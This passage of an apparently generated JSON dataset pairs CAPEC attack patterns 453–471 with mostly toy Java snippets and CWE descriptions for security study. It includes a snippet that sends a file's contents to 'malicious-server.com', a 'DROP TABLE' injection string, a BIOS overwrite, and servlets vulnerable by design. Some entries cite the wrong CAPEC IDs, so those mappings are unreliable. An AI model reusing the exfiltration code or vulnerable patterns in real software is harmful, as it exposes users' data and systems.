        "code_snippet": "public class MaliciousHardware {\n    private boolean isMalicious = true;\n\n    public void executeMaliciousLogic() {\n        if (isMalicious) {\n            // Embedded malicious code\n            System.out.println(\"Executing malicious logic...\");\n            // Unauthorized error injection\n            injectErrors();\n            // Authentication bypass by replay attack\n            bypassAuthentication();\n        }\n    }\n\n    private void injectErrors() {\n        System.out.println(\"Injecting errors to degrade system redundancy...\");\n        // Simulate error injection\n    }\n\n    private void bypassAuthentication() {\n        System.out.println(\"Bypassing authentication via capture-replay...\");\n        // Simulate capture-replay attack\n    }\n\n    public static void main(String[] args) {\n        MaliciousHardware hardware = new MaliciousHardware();\n        hardware.executeMaliciousLogic();\n    }\n}",
        "description": "This Java code snippet represents a malicious hardware component that executes embedded malicious logic. The `MaliciousHardware` class contains a method `executeMaliciousLogic` that checks if the hardware is malicious and then performs several malicious actions. These actions include injecting errors to degrade system redundancy (CWE-1334) and bypassing authentication via a capture-replay attack (CWE-294). The code simulates these actions with print statements, illustrating how malicious logic can be embedded in hardware to compromise system integrity and security."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "public class HardwareComponent {\n    private boolean isMalicious = false;\n    private String firmwareVersion = \"1.0.0\";\n\n    public void updateFirmware(String newFirmware) {\n        if (newFirmware.contains(\"malicious\")) {\n            isMalicious = true;\n        }\n        firmwareVersion = newFirmware;\n    }\n\n    public void performOperation() {\n        if (isMalicious) {\n            System.out.println(\"Performing malicious operation...\");\n            // Malicious code execution\n        } else {\n            System.out.println(\"Performing normal operation...\");\n            // Normal operation code\n        }\n    }\n\n    public static void main(String[] args) {\n        HardwareComponent component = new HardwareComponent();\n        component.updateFirmware(\"malicious_firmware_v2.0.0\");\n        component.performOperation();\n    }\n}",
        "description": "This Java code snippet represents a hardware component that can be updated with new firmware. The `updateFirmware` method checks if the new firmware contains the string \"malicious\" and sets a flag `isMalicious` accordingly. The `performOperation` method then performs different actions based on whether the firmware is malicious or not. This embodies the idea of CAPEC-452: Malicious Logic Insertion into Product Hardware, where an attacker could insert malicious logic into the hardware's firmware. The code also touches on CWE-506 (Embedded Malicious Code) by demonstrating how malicious code can be embedded and executed, and CWE-1329 (Reliance on Component That is Not Updateable) by implying that the component's firmware can be updated, but if it were not updateable, it would be vulnerable to persistent malicious code."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "public class MaliciousHardwareComponent {\n    private boolean isMalicious;\n    private String storedData;\n\n    public MaliciousHardwareComponent(boolean isMalicious) {\n        this.isMalicious = isMalicious;\n        this.storedData = \"Sensitive Data\";\n    }\n\n    public void modifyStoredData() {\n        if (isMalicious) {\n            // CWE-506: Embedded Malicious Code\n            this.storedData = \"Modified Data\";\n        }\n    }\n\n    public void bypassAuthentication() {\n        if (isMalicious) {\n            // CWE-592: Authentication Bypass Issues\n            System.out.println(\"Authentication Bypassed\");\n        }\n    }\n\n    public void injectErrors() {\n        if (isMalicious) {\n            // CWE-1334: Unauthorized Error Injection\n            System.out.println(\"Errors Injected, System Redundancy Degraded\");\n        }\n    }\n\n    public static void main(String[] args) {\n        MaliciousHardwareComponent component = new MaliciousHardwareComponent(true);\n        component.modifyStoredData();\n        component.bypassAuthentication();\n        component.injectErrors();\n    }\n}",
        "description": "This Java code snippet represents a malicious hardware component that embodies the main idea of CAPEC-457: Malicious Logic Insertion into Product Hardware. The class `MaliciousHardwareComponent` has a boolean flag `isMalicious` to indicate if the component is malicious. The methods `modifyStoredData`, `bypassAuthentication`, and `injectErrors` demonstrate vulnerabilities related to CWE-506 (Embedded Malicious Code), CWE-592 (Authentication Bypass Issues), and CWE-1334 (Unauthorized Error Injection), respectively. When the component is marked as malicious, it can modify stored data, bypass authentication, and inject errors to degrade system redundancy, illustrating the potential threats posed by counterfeit hardware components."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "public class InfectedMemoryExample {\n    private static final int PROTECTED_MEMORY_START = 0x1000;\n    private static final int PROTECTED_MEMORY_END = 0x1FFF;\n    private static final int MIRRORED_MEMORY_START = 0x2000;\n    private static final int MIRRORED_MEMORY_END = 0x2FFF;\n\n    private static byte[] memory = new byte[0x3000];\n\n    public static void main(String[] args) {\n        // Simulate secure boot process\n        secureBoot();\n\n        // Malicious code injection into mirrored memory\n        injectMaliciousCode(MIRRORED_MEMORY_START);\n\n        // Accessing protected memory through mirrored region\n        byte data = readMemory(MIRRORED_MEMORY_START);\n        System.out.println(\"Data from mirrored memory: \" + data);\n    }\n\n    private static void secureBoot() {\n        // Load bootloader code into protected memory\n        for (int i = PROTECTED_MEMORY_START; i <= PROTECTED_MEMORY_END; i++) {\n            memory[i] = (byte) (i & 0xFF); // Dummy bootloader code\n        }\n    }\n\n    private static void injectMaliciousCode(int address) {\n        if (address >= MIRRORED_MEMORY_START && address <= MIRRORED_MEMORY_END) {\n            memory[address] = (byte) 0xDE; // Malicious code\n        }\n    }\n\n    private static byte readMemory(int address) {\n        if (address >= PROTECTED_MEMORY_START && address <= PROTECTED_MEMORY_END) {\n            throw new SecurityException(\"Access to protected memory is denied!\");\n        }\n        return memory[address];\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can inject malicious code into a mirrored memory region, bypassing the intended access control mechanisms. The `secureBoot` method simulates the secure boot process by loading bootloader code into a protected memory region. The `injectMaliciousCode` method shows how an attacker can insert malicious code into a mirrored memory region, which is not adequately protected. The `readMemory` method attempts to enforce access control but fails to account for the mirrored memory region, allowing the attacker to read from it. This example embodies the main idea of the CAPEC 'Infected Memory' and highlights related CWEs such as improper access control for mirrored memory regions and overlapping protected and unprotected memory ranges."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\npublic class USBMalware {\n    public static void main(String[] args) {\n        try {\n            // Simulate reading sensitive data from a file (e.g., keystrokes, confidential data)\n            File file = new File(\"/path/to/sensitive/data.txt\");\n            FileInputStream fis = new FileInputStream(file);\n            Scanner scanner = new Scanner(fis);\n            StringBuilder data = new StringBuilder();\n            while (scanner.hasNextLine()) {\n                data.append(scanner.nextLine()).append(\"\\n\");\n            }\n            scanner.close();\n            fis.close();\n\n            // Transmit the data in cleartext to a remote server\n            URL url = new URL(\"http://malicious-server.com/exfiltrate\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            conn.setRequestMethod(\"POST\");\n            conn.getOutputStream().write(data.toString().getBytes());\n            conn.getOutputStream().flush();\n            conn.getOutputStream().close();\n\n            // Check the response code\n            int responseCode = conn.getResponseCode();\n            if (responseCode == 200) {\n                System.out.println(\"Data exfiltrated successfully.\");\n            } else {\n                System.out.println(\"Failed to exfiltrate data.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates a USB malware attack that reads sensitive data from a file and exfiltrates it to a remote server over an unencrypted HTTP connection. The code embodies the main idea of the CAPEC 'USB Memory Attacks' by demonstrating how malicious code on a USB device can steal and transmit confidential data. The code also highlights several related CWEs: 'Cleartext Transmission of Sensitive Information' (CWE-319) by sending data in cleartext, 'Embedded Malicious Code' (CWE-506) by containing malicious functionality, and 'Missing Protection Mechanism for Alternate Hardware Interface' (CWE-1299) by exploiting the lack of protection on the USB interface."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class FlashMemoryAttack {\n    private static final String BIOS_FILE_PATH = \"/path/to/bios.bin\";\n    private static final byte[] MALICIOUS_CODE = {0x00, 0x01, 0x02, 0x03}; // Example malicious payload\n\n    public static void main(String[] args) {\n        try {\n            flashMaliciousBIOS();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void flashMaliciousBIOS() throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(BIOS_FILE_PATH)) {\n            fos.write(MALICIOUS_CODE);\n            System.out.println(\"BIOS flashed with malicious code.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a flash memory attack, where malicious code is written to a BIOS file. The `flashMaliciousBIOS` method opens a file output stream to the BIOS file path and writes a byte array representing the malicious payload. This embodies the main idea of CAPEC-Flash Memory Attacks, specifically targeting the integrity of flash memory by inserting malicious logic. The code also touches on CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory) by showing how supposedly immutable BIOS data can be overwritten, and CWE-506 (Embedded Malicious Code) by embedding a malicious payload into the BIOS."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.cert.CertificateException;\nimport java.security.cert.CertificateFactory;\nimport java.security.cert.X509Certificate;\nimport java.util.Base64;\n\npublic class RogueCertificateExample {\n    public static void main(String[] args) throws CertificateException, NoSuchAlgorithmException {\n        // Simulate a weak hashing algorithm (e.g., MD5)\n        MessageDigest md = MessageDigest.getInstance(\"MD5\");\n        String originalCSR = \"Original Certificate Signing Request\";\n        String rogueCSR = \"Rogue Certificate Signing Request\";\n\n        // Generate hash for both CSRs\n        byte[] originalHash = md.digest(originalCSR.getBytes());\n        byte[] rogueHash = md.digest(rogueCSR.getBytes());\n\n        // Simulate hash collision (for demonstration purposes, we assume they collide)\n        if (MessageDigest.isEqual(originalHash, rogueHash)) {\n            System.out.println(\"Hash collision detected!\");\n\n            // Simulate the trusted CA signing the original CSR\n            String signedBlob = Base64.getEncoder().encodeToString(originalHash);\n\n            // Create a rogue certificate using the signed blob\n            String rogueCertificate = \"-----BEGIN CERTIFICATE-----\\n\" + signedBlob + \"\\n-----END CERTIFICATE-----\";\n\n            // Validate the rogue certificate (improper validation)\n            CertificateFactory cf = CertificateFactory.getInstance(\"X.509\");\n            X509Certificate cert = (X509Certificate) cf.generateCertificate(\n                    new java.io.ByteArrayInputStream(rogueCertificate.getBytes()));\n\n            // Improperly validate the certificate (ignoring host mismatch and chain of trust)\n            try {\n                cert.checkValidity();\n                System.out.println(\"Rogue certificate is valid!\");\n            } catch (CertificateException e) {\n                System.out.println(\"Certificate validation failed: \" + e.getMessage());\n            }\n        } else {\n            System.out.println(\"No hash collision detected.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5) to generate a hash collision. The code simulates the process of generating two different Certificate Signing Requests (CSRs) that result in the same hash value. It then shows how an adversary can use the signed blob from a trusted Certificate Authority (CA) to create a rogue certificate that appears valid. The code also highlights improper certificate validation practices, such as ignoring host mismatches and not following the chain of trust, which can lead to authentication bypass and spoofing attacks."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerable\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        String role = request.getParameter(\"role\");\n\n        // Potentially vulnerable code: HTTP Parameter Pollution\n        String query = \"SELECT * FROM users WHERE userId='\" + userId + \"' AND role='\" + role + \"'\";\n\n        // Simulate database query execution\n        System.out.println(\"Executing query: \" + query);\n\n        response.getWriter().write(\"Query executed\");\n    }\n}",
        "description": "This Java servlet code demonstrates a potential vulnerability to HTTP Parameter Pollution (HPP). The servlet processes HTTP GET requests and retrieves 'userId' and 'role' parameters from the query string. The code constructs an SQL query using these parameters without proper validation or neutralization, making it susceptible to HPP attacks. An attacker could inject additional parameters to manipulate the query, potentially leading to unauthorized access or data leakage. This example also touches on related CWEs, such as improper handling of extra parameters (CWE-235) and the use of GET request method with sensitive query strings (CWE-598)."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class WebServiceAPI {\n    private static final String SECRET_TOKEN = \"secret\";\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String userInput = \"user=data&timestamp=123456\";\n        String signature = generateSignature(userInput);\n        System.out.println(\"Generated Signature: \" + signature);\n\n        // Simulate an attacker modifying the input\n        String attackerInput = \"user=attacker&timestamp=123456\";\n        String forgedSignature = generateSignature(attackerInput);\n        System.out.println(\"Forged Signature: \" + forgedSignature);\n    }\n\n    private static String generateSignature(String data) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-328: Use of Weak Hash\n        md.update((data + SECRET_TOKEN).getBytes());\n        byte[] digest = md.digest();\n        return Base64.getEncoder().encodeToString(digest);\n    }\n\n    public static boolean authenticate(String data, String signature) throws NoSuchAlgorithmException {\n        String expectedSignature = generateSignature(data);\n        return expectedSignature.equals(signature); // CWE-290: Authentication Bypass by Spoofing\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable web service API that uses a weak hash function (MD5) to generate a signature for authentication purposes. The `generateSignature` method appends a secret token to the input data and generates an MD5 hash, which is then Base64 encoded. The `authenticate` method compares the provided signature with the expected signature. The vulnerability lies in the use of a weak hash function (CWE-328) and the potential for an attacker to modify the input data and generate a valid signature without knowing the secret token (CAPEC-###). This can lead to authentication bypass (CWE-290) and other related weaknesses."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class CrossDomainTimingAttack {\n    public static void main(String[] args) throws IOException {\n        String targetUrl = \"http://example.com/sensitiveEndpoint\";\n        long startTime = System.currentTimeMillis();\n        HttpURLConnection connection = (HttpURLConnection) new URL(targetUrl).openConnection();\n        connection.setRequestMethod(\"GET\");\n        int responseCode = connection.getResponseCode();\n        long endTime = System.currentTimeMillis();\n        long duration = endTime - startTime;\n        System.out.println(\"Response Code: \" + responseCode);\n        System.out.println(\"Response Time: \" + duration + \" ms\");\n    }\n}",
        "description": "This Java code snippet demonstrates a basic cross-domain timing attack. The attacker sends an HTTP GET request to a target URL and measures the time taken to receive a response. The response time can reveal information about the server's state or the presence of certain data, even though the attacker cannot directly read the response due to the same-origin policy. This embodies the main idea of CAPEC-233 (Cross-Domain Search Timing) and relates to CWE-385 (Covert Timing Channel) and CWE-208 (Observable Timing Discrepancy). The code does not include any CSRF or XSS vulnerabilities directly but highlights the timing aspect of the attack."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.spec.IvParameterSpec;\nimport java.util.Base64;\n\npublic class PaddingOracleExample {\n    private static final String KEY = \"1234567890123456\"; // Example key\n    private static final String IV = \"1234567890123456\"; // Example IV\n\n    public static void main(String[] args) {\n        String ciphertext = \"...\"; // Example ciphertext\n        try {\n            decrypt(ciphertext);\n        } catch (Exception e) {\n            System.out.println(\"Decryption error: \" + e.getMessage()); // CWE-209: Leaking error message\n        }\n    }\n\n    public static void decrypt(String ciphertext) throws Exception {\n        byte[] decodedCiphertext = Base64.getDecoder().decode(ciphertext);\n        Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes(), \"AES\");\n        IvParameterSpec ivSpec = new IvParameterSpec(IV.getBytes());\n        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);\n        cipher.doFinal(decodedCiphertext); // CWE-649: No integrity check\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable decryption process that can be exploited in a Padding Oracle Crypto Attack. The code uses AES encryption in CBC mode with PKCS5 padding. The main vulnerability lies in the error message leakage (CWE-209) when a decryption error occurs, which can inform an attacker about padding errors. Additionally, the code does not perform any integrity checks on the ciphertext (CWE-649), making it susceptible to tampering. This combination allows an attacker to use the system as a padding oracle to decrypt data without knowing the encryption key."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import java.io.*;\nimport javax.servlet.http.*;\n\npublic class EvercookieExample extends HttpServlet {\n    private static final String COOKIE_NAME = \"evercookie\";\n    private static final String COOKIE_VALUE = \"sensitiveData\";\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Set the cookie in multiple locations\n        setCookie(response);\n        setLocalStorage(response);\n        setSessionStorage(response);\n        setFlashCookie(response);\n    }\n\n    private void setCookie(HttpServletResponse response) {\n        Cookie cookie = new Cookie(COOKIE_NAME, COOKIE_VALUE);\n        cookie.setMaxAge(60 * 60 * 24 * 365); // 1 year\n        response.addCookie(cookie);\n    }\n\n    private void setLocalStorage(HttpServletResponse response) throws IOException {\n        PrintWriter out = response.getWriter();\n        out.println(\"<script>\");\n        out.println(\"localStorage.setItem('\" + COOKIE_NAME + \"', '\" + COOKIE_VALUE + \"');\");\n        out.println(\"</script>\");\n    }\n\n    private void setSessionStorage(HttpServletResponse response) throws IOException {\n        PrintWriter out = response.getWriter();\n        out.println(\"<script>\");\n        out.println(\"sessionStorage.setItem('\" + COOKIE_NAME + \"', '\" + COOKIE_VALUE + \"');\");\n        out.println(\"</script>\");\n    }\n\n    private void setFlashCookie(HttpServletResponse response) throws IOException {\n        PrintWriter out = response.getWriter();\n        out.println(\"<object type='application/x-shockwave-flash' data='evercookie.swf' width='1' height='1'>\");\n        out.println(\"<param name='movie' value='evercookie.swf' />\");\n        out.println(\"<param name='FlashVars' value='cookieName=\" + COOKIE_NAME + \"&cookieValue=\" + COOKIE_VALUE + \"' />\");\n        out.println(\"</object>\");\n    }\n}",
        "description": "This Java servlet code demonstrates the concept of an 'evercookie', which is a highly persistent cookie that is stored in multiple locations on the user's machine. The code sets a cookie with sensitive information in traditional HTTP cookies, HTML5 local storage, HTML5 session storage, and Flash cookies. This makes it difficult for the user to completely remove the cookie, as it will be regenerated from any remaining storage location. This example embodies the CAPEC description by showing how a cookie can persist across different storage mechanisms, making it hard to delete. The code also highlights several related CWEs, such as storing sensitive information in cookies (CWE-539, CWE-315) and the lack of validation and integrity checking (CWE-784, CWE-565)."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TransparentProxy {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ProxyHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ProxyHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ProxyHandler(Socket clientSocket) {\n        this.clientSocket = clientSocket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            InputStream clientInput = clientSocket.getInputStream();\n            OutputStream clientOutput = clientSocket.getOutputStream();\n\n            // Read the client's request\n            BufferedReader reader = new BufferedReader(new InputStreamReader(clientInput));\n            String requestLine = reader.readLine();\n\n            // Forward the request to the destination server\n            Socket serverSocket = new Socket(\"destination.server.com\", 80);\n            OutputStream serverOutput = serverSocket.getOutputStream();\n            serverOutput.write((requestLine + \"\\r\\n\").getBytes());\n            serverOutput.flush();\n\n            // Read the response from the server\n            InputStream serverInput = serverSocket.getInputStream();\n            BufferedReader serverReader = new BufferedReader(new InputStreamReader(serverInput));\n            String responseLine;\n            while ((responseLine = serverReader.readLine()) != null) {\n                // Forward the response back to the client\n                clientOutput.write((responseLine + \"\\r\\n\").getBytes());\n                clientOutput.flush();\n            }\n\n            // Close connections\n            serverSocket.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple transparent proxy server. The proxy listens for incoming client connections on port 8080. When a client connects, the proxy reads the client's request and forwards it to a destination server (\"destination.server.com\" on port 80). The proxy then reads the response from the destination server and forwards it back to the client. This process is done transparently, meaning the client is unaware of the proxy's presence.\n\nThe code embodies the main idea of CAPEC 'Transparent Proxy Abuse' by acting as an intermediary between the client and the destination server. It also touches on several related CWEs:\n\n- CWE-441: The proxy does not preserve the original source of the request, making it appear as the source of the request.\n- CWE-444: The proxy does not handle malformed HTTP requests or responses, which could lead to HTTP request/response smuggling.\n- CWE-602: The proxy relies on the client to enforce security mechanisms, which is a flawed approach.\n- CWE-212: The proxy does not remove sensitive information before forwarding requests and responses, potentially exposing sensitive data.\n- CWE-941: The proxy may incorrectly specify the destination server, leading to communication with unintended actors."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableHttpClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api/data\"); // Non-TLS connection\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            connection.setRequestProperty(\"Authorization\", \"Bearer some-token\");\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                // Output the response\n                System.out.println(response.toString());\n            } else {\n                System.out.println(\"GET request failed\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable HTTP client that connects to a non-TLS endpoint (http://example.com/api/data). The code does not verify the identity of the endpoint (CWE-923) and sends an authorization token over an insecure channel, making it susceptible to an active adversary in the middle attack (CAPEC-94). An attacker on the same network, such as a public WiFi hotspot, could intercept and manipulate the communication, bypassing the same origin policy protection in the victim's browser. The code highlights the risk of not using secure communication channels and not properly ensuring the integrity and authenticity of the endpoints."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\n@WebServlet(\"/fetchUserInfo\")\npublic class FetchUserInfoServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String socialNetworkApiUrl = \"https://socialnetwork.com/api/userinfo?session=\" + request.getParameter(\"session\");\n        URL url = new URL(socialNetworkApiUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n\n        if (conn.getResponseCode() != 200) {\n            throw new RuntimeException(\"Failed : HTTP error code : \" + conn.getResponseCode());\n        }\n\n        Scanner scanner = new Scanner(conn.getInputStream());\n        String jsonResponse = \"\";\n        while (scanner.hasNext()) {\n            jsonResponse += scanner.nextLine();\n        }\n        scanner.close();\n\n        response.setContentType(\"application/json\");\n        PrintWriter out = response.getWriter();\n        out.print(jsonResponse);\n        out.flush();\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a potential Cross Site Identification attack. The servlet fetches user information from a social networking site using an active session identifier provided as a query parameter. The code constructs a URL with the session identifier and makes a GET request to the social network's API to retrieve user information. The response is then sent back to the client. This code is vulnerable to several issues: \n1. CWE-352 (CSRF): The servlet does not verify if the request is intentionally made by the user.\n2. CWE-359 (Exposure of Private Personal Information): The servlet exposes user information without proper authorization checks.\n3. CWE-598 (Use of GET Request Method With Sensitive Query Strings): The session identifier is included in the URL query string, which can be logged or intercepted.\n4. CWE-79 (Cross-site Scripting): The response is directly written to the output without proper sanitization, making it vulnerable to XSS attacks."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class CSSInjectionServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String cssUrl = request.getParameter(\"cssUrl\");\n        if (cssUrl != null && !cssUrl.isEmpty()) {\n            // Vulnerable to CSS Injection\n            response.setContentType(\"text/css\");\n            response.getWriter().write(\"@import url('\" + cssUrl + \"');\");\n        } else {\n            response.getWriter().write(\"/* No CSS URL provided */\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Generic Cross-Browser Cross-Domain Theft via CSS injection. The servlet takes a 'cssUrl' parameter from the request and directly includes it in a CSS @import statement without proper validation or sanitization. This can lead to cross-domain data theft as the browser will send cookies and other sensitive information when loading the CSS from the specified URL. The code is also susceptible to CWE-707 (Improper Neutralization), CWE-149 (Improper Neutralization of Quoting Syntax), CWE-177 (Improper Handling of URL Encoding), CWE-838 (Inappropriate Encoding for Output Context), and CWE-79 (Cross-site Scripting) due to the lack of input validation and encoding."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Simulate resource allocation without limits\n        while (true) {\n            // Keep the connection open indefinitely\n            response.getWriter().write(\"Keeping connection open...\");\n            response.getWriter().flush();\n            try {\n                Thread.sleep(1000); // Sleep to simulate delay\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to an HTTP DoS attack by keeping the HTTP session alive indefinitely. The `doGet` method enters an infinite loop, continuously writing to the response and flushing the output stream, which keeps the connection open. This simulates the resource allocation without limits (CWE-770) and insufficient resource pool (CWE-410) weaknesses. An attacker could exploit this by making numerous requests to this servlet, causing the server to exhaust its resources and become unresponsive to legitimate users."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableDatabaseAccess {\n    public static void main(String[] args) {\n        String userInput = \"'; DROP TABLE users; --\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n\n            // Execute a system command (dangerous)\n            String osCommand = \"ls -la\";\n            Runtime.getRuntime().exec(osCommand);\n\n            // Improperly closed cursor\n            // rs.close(); // This should be uncommented to properly close the cursor\n            // stmt.close(); // This should be uncommented to properly close the statement\n            // conn.close(); // This should be uncommented to properly close the connection\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable database access scenario that embodies the main idea of the CAPEC 'Expanding Control over the Operating System from the Database'. The code constructs an SQL query using user input without proper sanitization, leading to an SQL Injection vulnerability (CWE-89). The malicious input can alter the SQL command to drop a table. Additionally, the code executes a system command using `Runtime.getRuntime().exec`, which can be exploited if the attacker gains control over the input, demonstrating 'Execution with Unnecessary Privileges' (CWE-250). The code also shows an example of a dangling database cursor (CWE-619) by not properly closing the ResultSet, Statement, and Connection objects, which could lead to privilege escalation or resource leakage."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class SearchOrderHijackingExample {\n    public static void main(String[] args) {\n        String libraryName = \"example.dll\";\n        String currentDir = System.getProperty(\"user.dir\");\n        String tempDir = System.getProperty(\"java.io.tmpdir\");\n\n        // Vulnerable: Loading library from the current directory first\n        System.load(currentDir + File.separator + libraryName);\n\n        // Simulate an attacker placing a rogue library in the temp directory\n        Path rogueLibrary = Paths.get(tempDir, libraryName);\n        try {\n            Files.copy(Paths.get(\"/path/to/rogue/library.dll\"), rogueLibrary, StandardCopyOption.REPLACE_EXISTING);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Vulnerable: Loading library from the temp directory\n        System.load(tempDir + File.separator + libraryName);\n    }\n}",
